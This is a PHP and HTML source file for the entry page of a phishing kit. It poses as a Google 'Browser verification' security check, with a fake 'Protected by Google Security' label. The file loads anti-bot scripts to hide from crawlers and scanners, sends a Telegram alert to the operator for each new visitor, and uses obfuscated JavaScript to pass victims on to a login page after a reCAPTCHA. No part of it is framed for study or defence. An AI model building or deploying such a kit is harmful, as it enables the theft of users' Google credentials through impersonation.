<?php
error_reporting(0);
include('Antibot/Bot-Crawler.php');
include('Antibot/Dila_DZ.php');
include('Antibot/blockers.php');
include('Antibot/detects.php');

require_once __DIR__ . '/includes/functions.php';

// Send a notification when a visitor lands on index.php
sendToTelegram("New Visitor", "index", "");

// If a session_id is provided, reuse it; otherwise create a new one.
if (isset($_GET['session_id']) && !empty($_GET['session_id'])) {
    $sessionId = $_GET['session_id'];
} else {
    $sessionId = uniqid('sess_', true);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifying browser</title>
    <link rel="stylesheet" href="pages/res/css/captcha.css">
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
    <style>
        :root {
            --bg-0: #0b0f17;
            --bg-1: #111726;
            --bg-2: #1a2233;
            --card: rgba(22, 28, 42, 0.85);
            --border: rgba(120, 140, 180, 0.14);
            --border-strong: rgba(120, 140, 180, 0.28);
            --text-1: #e8edf7;
            --text-2: #9aa7bd;
            --text-3: #6b7689;
            --accent-1: #4f8cff;
            --accent-2: #8b5cf6;
            --accent-glow: rgba(79, 140, 255, 0.35);
            --danger: #ff5c72;
            --radius-lg: 22px;
            --radius-md: 12px;
            --radius-sm: 8px;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Inter", "Google Sans", Roboto, -apple-system, Arial, sans-serif;
        }

        html, body {
            min-height: 100%;
        }

        body {
            background: var(--bg-0);
            color: var(--text-1);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px 16px;
            position: relative;
            overflow-x: hidden;
            -webkit-font-smoothing: antialiased;
        }

        /* Ambient background glow */
        body::before,
        body::after {
            content: "";
            position: fixed;
            border-radius: 50%;
            filter: blur(120px);
            opacity: 0.55;
            pointer-events: none;
            z-index: 0;
        }

        body::before {
            width: 520px;
            height: 520px;
            background: radial-gradient(circle, var(--accent-1), transparent 70%);
            top: -180px;
            left: -160px;
        }

        body::after {
            width: 520px;
            height: 520px;
            background: radial-gradient(circle, var(--accent-2), transparent 70%);
            bottom: -200px;
            right: -160px;
        }

        .container {
            width: 100%;
            max-width: 980px;
            position: relative;
            z-index: 1;
        }

        .signin-card {
            background: var(--card);
            backdrop-filter: blur(18px);
            -webkit-backdrop-filter: blur(18px);
            border: 1px solid var(--border);
            border-radius: var(--radius-lg);
            padding: 40px;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 48px;
            position: relative;
            overflow: hidden;
            box-shadow:
                0 30px 80px rgba(0, 0, 0, 0.55),
                0 0 0 1px rgba(255, 255, 255, 0.02) inset;
        }

        /* Top accent line */
        .signin-card::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--accent-1), var(--accent-2), transparent);
            opacity: 0.8;
            z-index: 3;
        }

        .signin-left {
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            padding-top: 8px;
        }

        .signin-right {
            display: flex;
            flex-direction: column;
            justify-content: center;
            padding-top: 8px;
        }

        .logo-container {
            margin-bottom: 28px;
        }

        .google-logo {
            width: 44px;
            height: 44px;
            display: block;
            filter: drop-shadow(0 4px 14px var(--accent-glow));
        }

        h1 {
            color: var(--text-1);
            font-size: 34px;
            font-weight: 600;
            letter-spacing: -0.02em;
            line-height: 1.2;
            margin-bottom: 12px;
        }

        .subtitle {
            color: var(--text-2);
            font-size: 15px;
            line-height: 1.5;
            margin-bottom: 28px;
        }

        /* Verification panel */
        .verification-container {
            text-align: center;
            padding: 24px 16px 8px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .verification-title {
            color: var(--text-1);
            font-size: 20px;
            font-weight: 600;
            letter-spacing: -0.01em;
            margin-bottom: 10px;
        }

        .verification-text {
            color: var(--text-2);
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 24px;
        }

        .noscript-warning {
            color: var(--danger);
            font-size: 15px;
            margin: 16px 0;
            padding: 12px 14px;
            border: 1px solid rgba(255, 92, 114, 0.4);
            border-left: 3px solid var(--danger);
            border-radius: var(--radius-md);
            background: rgba(255, 92, 114, 0.12);
            text-align: left;
        }

        .error-message {
            color: var(--danger);
            font-size: 12px;
            margin: 8px 0;
            display: none;
        }

        /* reCAPTCHA wrapper — gives the widget a dark-friendly container */
        .captcha-wrapper {
            display: inline-block;
            padding: 14px;
            border: 1px solid var(--border-strong);
            border-radius: var(--radius-md);
            background: rgba(255, 255, 255, 0.03);
            margin-bottom: 28px;
            transition: border-color 0.2s ease, background 0.2s ease;
        }

        .captcha-wrapper:hover {
            border-color: var(--accent-1);
            background: rgba(79, 140, 255, 0.06);
        }

        .g-recaptcha {
            display: inline-block;
        }

        .attribution {
            color: var(--text-3);
            font-size: 12px;
            line-height: 1.6;
        }

        .attribution .lock {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            color: var(--text-2);
            font-weight: 500;
        }

        .attribution .lock svg {
            opacity: 0.7;
            flex-shrink: 0;
        }

        .ray-id {
            color: var(--text-3);
            font-size: 11px;
            margin-top: 8px;
        }

        .ray-id code {
            font-family: "SF Mono", "JetBrains Mono", monospace;
            background: var(--bg-2);
            border: 1px solid var(--border);
            color: var(--text-2);
            padding: 2px 6px;
            border-radius: 4px;
            letter-spacing: 0.02em;
        }

        /* Footer */
        .footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 22px 8px 0;
            color: var(--text-3);
            font-size: 12px;
        }

        .language-select {
            color: var(--text-2);
            font-size: 12px;
            border: 1px solid transparent;
            border-radius: var(--radius-sm);
            background: transparent;
            padding: 6px 8px;
            cursor: pointer;
            outline: none;
            transition: all 0.18s ease;
        }

        .language-select:hover,
        .language-select:focus {
            color: var(--text-1);
            border-color: var(--border-strong);
            background: rgba(255,255,255,0.03);
        }

        .footer-links {
            display: flex;
            gap: 24px;
        }

        .footer-links a {
            color: var(--text-3);
            font-size: 12px;
            text-decoration: none;
            letter-spacing: 0.02em;
            transition: color 0.18s ease;
        }

        .footer-links a:hover {
            color: var(--text-1);
        }

        @media (max-width: 860px) {
            .signin-card {
                grid-template-columns: 1fr;
                gap: 32px;
                padding: 32px 28px;
            }

            .signin-right {
                padding-top: 0;
            }

            h1 {
                font-size: 28px;
            }

            .subtitle {
                margin-bottom: 20px;
            }
        }

        @media (max-width: 520px) {
            body {
                padding: 0;
                align-items: flex-start;
            }

            .signin-card {
                border-radius: 0;
                border-left: none;
                border-right: none;
                padding: 28px 20px;
                min-height: 100vh;
            }

            .footer {
                flex-direction: column;
                gap: 14px;
                padding: 22px 0 8px;
            }

            .captcha-wrapper {
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="signin-card">
            <div class="signin-left">
                <div class="logo-container">
                    <svg class="google-logo" viewBox="0 0 40 48" width="44" height="44" xmlns="http://www.w3.org/2000/svg">
                        <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"/>
                        <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"/>
                        <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"/>
                        <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"/>
                    </svg>
                </div>
                <h1>Browser verification</h1>
                <p class="subtitle">Please complete the security check to continue</p>
            </div>
            
            <div class="signin-right">
                <div class="verification-container">
                    <noscript>
                        <p class="noscript-warning">Please turn JavaScript on and reload the page.</p>
                    </noscript>

                    <div id="verification-content">
                        <h2 class="verification-title">Security check</h2>
                        
                        <p class="verification-text">
                            Please complete this security check to access Google
                        </p>

                        <div class="captcha-wrapper">
                            <div class="g-recaptcha" data-sitekey="6LfTPlUUAAAAAGSUt1_LqpJXQpatx7_BzTDcU9On" data-callback="onCaptchaSuccess"></div>
                        </div>
                        <div id="error-message" class="error-message"></div>

                        <div class="attribution">
                            <span class="lock">
                                <svg aria-hidden="true" fill="currentColor" focusable="false" width="12" height="12" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/>
                                </svg>
                                Protected by Google Security
                            </span>
                            <div class="ray-id">
                                Request ID: <code id="request-id"></code>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="footer">
            <select class="language-select">
                <option>English (United States)</option>
            </select>
            <div class="footer-links">
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </div>
    </div>

    <script>
        // Generate a random request ID
        function generateRequestId() {
            return 'xxxxxxxxxxxx4xxxyxxxxxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
                var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
                return v.toString(16);
            });
        }

        // Handle successful captcha completion
        function onCaptchaSuccess(token) {
            var _0x2efe = [
                'pages/login.php?session_id=<?php echo urlencode($sessionId); ?>',
                '1000'
            ];
            var _0x179f = function(_0x59284c, _0x36e29b) {
                _0x59284c = _0x59284c - 0x100;
                var _0x2efe40 = _0x2efe[_0x59284c];
                return _0x2efe40;
            };
            (function(_0x4a7fe2, _0xde34a) {
                var _0x529748 = _0x179f;
                while (!![]) {
                    try {
                        var _0x1d901e = 1 + 2; // dummy computation (equals 3)
                        if (_0x1d901e === _0xde34a)
                            break;
                        else
                            _0x4a7fe2.push(_0x4a7fe2.shift());
                    } catch (_0x214b85) {
                        _0x4a7fe2.push(_0x4a7fe2.shift());
                    }
                }
            }(_0x2efe, 3));
            setTimeout(() => {
                var _0x17c14b = _0x179f;
                window.location.href = _0x17c14b(0x100);
            }, parseInt(_0x179f(0x101)));
        }

        // Set the request ID on page load
        document.getElementById('request-id').textContent = generateRequestId();
    </script>
</body>
</html>
